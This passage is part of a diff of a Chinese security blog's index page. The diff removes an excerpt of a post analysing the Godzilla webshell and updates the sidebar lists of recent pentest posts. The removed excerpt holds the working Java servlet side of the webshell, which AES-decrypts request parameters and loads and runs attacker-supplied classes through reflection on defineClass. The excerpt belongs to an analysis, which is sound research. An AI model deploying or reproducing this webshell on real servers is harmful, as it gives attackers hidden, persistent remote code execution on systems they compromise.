class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>
-        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据m的值判断是加密还是解密，m是true的时候变量为1，这时候表示加密模式，反之是解密模式</span>
-            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token annotation punctuation">@Override</span>
-    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
-                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//用于第一次接受请求初始化payload</span>
-            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//                Object f = payload.newInstance(); </span>
-                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//本地加载payload，用于动态调试</span>
-                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>在哥斯拉主界面，点击测试会在burp发送两次请求，然后哥斯拉会弹框出现Success，这时候再点击确定，哥斯拉会发起第三次请求，先分析这三次请求的数据包以及哥斯拉都做了什么事情。<br><img src="/2022/05/17/godzilla/1.png"></p>
-<h3 id="第一次请求"><a href="#第一次请求" class="headerlink" title="第一次请求"></a>第一次请求</h3>
-	
-	</div>
-  <a type="button" href="/2022/05/17/godzilla.html#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -724,7 +622,7 @@
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -745,23 +643,23 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
+      </li>
+    
+      <li>
         <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
-      </li>
-    
-      <li>
-        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
   </ul>
